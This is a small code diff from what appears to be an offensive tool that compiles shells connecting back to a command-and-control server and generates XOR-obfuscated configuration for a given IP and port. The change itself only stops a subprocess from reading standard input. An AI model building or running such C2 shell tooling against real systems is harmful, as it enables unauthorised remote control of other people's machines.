@@ -372,6 +372,7 @@ def compile_shell_with_c2(ip, port):
         [sys.executable, listener, str(port), "--gen"],
         capture_output=True, text=True, timeout=30,
         encoding="utf-8", errors="replace",
+        stdin=subprocess.DEVNULL,
     )
     if result.returncode == 0:
         log_ok(f"XOR config generated for {ip}:{port}")
